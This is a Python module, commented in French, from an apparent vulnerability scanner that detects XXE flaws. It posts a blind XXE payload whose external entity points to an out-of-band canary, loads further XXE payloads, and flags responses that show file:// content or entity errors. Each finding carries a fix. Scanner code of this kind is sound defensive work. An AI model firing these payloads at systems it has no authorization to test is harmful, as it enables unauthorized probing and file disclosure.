"""
Module : XXE (XML External Entity) — détection légère.

Envoie un POST/GET de prouve avec un payload XML contenant une déclaration
DOCTYPE et une entité externe pointant vers un canary. Vérifie si la réponse
contient la marque ou une erreur de parsing révélatrice.

⚠️ Ne fait pas d'exfiltration réelle (notre payload pointe vers un faux host).

OWASP A05 / CWE-611.
"""
from __future__ import annotations
from typing import List, Dict, Any
import re

from scanner.core import http
from scanner.core.module_base import ScannerModule, Finding
from scanner.core.oob import OOBCanary
from scanner.payloads import get_payloads


class XxeModule(ScannerModule):
    name = "xxe"
    category = "injection"
    title = "XML External Entity"
    description = "Test XXE via payload DOCTYPE — détecte les parseurs XML mal configurés."
    default_enabled = False

    XML_ENDPOINTS_HINTS = ("xml", "soap", "rss", "atom", "wsdl", "api")

    def scan(self, target: str, context: Dict[str, Any]) -> List[Finding]:
        if not re.match(r"^https?://", target):
            return []

        # On envoie le payload XML uniquement si l'URL paraît acceptable
        # (sinon ça pollue inutilement les serveurs HTML).
        if not any(hint in target.lower() for hint in self.XML_ENDPOINTS_HINTS):
            return []

        findings: List[Finding] = []

        # === XXE aveugle via rappel OOB ===
        # Entité externe pointant sur le canary : si le parseur la résout, le
        # serveur appelle notre canary -> preuve imparable, sans retour visible.
        canary = OOBCanary.new(context)
        if canary.url:
            oob_payload = (
                '<?xml version="1.0"?>'
                f'<!DOCTYPE r [<!ENTITY xxe SYSTEM "{canary.url}">]>'
                '<r>&xxe;</r>'
            )
            try:
                http.post(target, context, capture=True, data=oob_payload, timeout=8, headers={
                    "Content-Type": "application/xml", "User-Agent": "VulnScan/1.2",
                })
            except Exception:
                pass
            left = http.time_left(context)
            wait = 4 if left is None else min(4, left)
            if wait > 0 and canary.wait_for_hit(context, timeout=wait):
                hit = canary.hits()[0] if canary.hits() else {}
                findings.append(Finding(
                    type="xxe", severity="critical",
                    title="XXE aveugle confirmé via OOB",
                    description=(
                        f"Le parseur XML a résolu une entité externe pointant vers le canary "
                        f"{canary.url} (méthode {hit.get('method', '?')}). XXE exploitable "
                        "même sans retour visible dans la réponse."
                    ),
                    recommendation=(
                        "Désactiver les entités externes et les DOCTYPE côté parseur "
                        "(defusedxml, disallow-doctype-decl, libxml_disable_entity_loader)."
                    ),
                    url=target, parameter="(body XML)", payload=oob_payload,
                    evidence=f"Hit OOB : {hit.get('method')} from {hit.get('ip')} UA={hit.get('user_agent', '')[:60]}",
                    confidence=95, cwe_id="CWE-611", owasp_id="A05:2021", cvss_base=9.8,
                    detection_method="oob-canary", source="module:xxe",
                ))
                return findings

        # Signatures :
        #  - erreur de DOCTYPE / DTD non autorisé → bon comportement
        #  - "file://" dans la réponse → XXE confirmé (parsing actif)
        #  - "Entity 'xxe' was referenced..." → XXE confirmé partiel
        for p in get_payloads("xxe", depth=context.get("depth")):
            payload = p["payload"]
            try:
                r, req_ev, resp_ev = http.post(target, context, capture=True, data=payload, timeout=8, headers={
                    "Content-Type": "application/xml",
                    "User-Agent": "VulnScan/1.2",
                })
                if r is None:
                    continue
                body = r.text
            except Exception:
                continue

            if re.search(r"file://[a-z0-9/.\-_]+", body, re.I):
                findings.append(Finding(
                    type="xxe", severity="critical",
                    title="XXE : fichier externe lu",
                    description="Le payload XXE avec ENTITY SYSTEM \"file://...\" est interprété et la valeur revient dans la réponse.",
                    recommendation=(
                        "Désactiver les entités externes côté parseur (DEFUSEDXML en Python, "
                        "setFeature 'disallow-doctype-decl' en Java, libxml_disable_entity_loader en PHP)."
                    ),
                    url=target, parameter="(body XML)",
                    payload=payload,
                    evidence=re.search(r"file://[a-z0-9/.\-_]+", body, re.I).group(0),
                    confidence=95,
                    cwe_id="CWE-611", owasp_id="A05:2021",
                    cvss_base=9.8,
                    detection_method="payload-doctype",
                    source="module:xxe",
                    evidence_request=req_ev, evidence_response=resp_ev,
                ))
                break
            elif re.search(r"xml.*(entity|doctype)", body, re.I):
                findings.append(Finding(
                    type="xxe", severity="medium",
                    title="XXE : parseur révélant l'entité",
                    description="Le parseur XML rapporte une référence à 'xxe' — indice d'un parseur permissif.",
                    recommendation="Désactiver les DOCTYPE et entités externes côté parseur.",
                    url=target, parameter="(body XML)",
                    payload=payload,
                    evidence=re.search(r"xml.*(entity|doctype).*", body, re.I).group(0)[:200],
                    confidence=70,
                    cwe_id="CWE-611", owasp_id="A05:2021",
                    cvss_base=7.5,
                    detection_method="error-signal",
                    source="module:xxe",
                    evidence_request=req_ev, evidence_response=resp_ev,
                ))
                break
        return findings
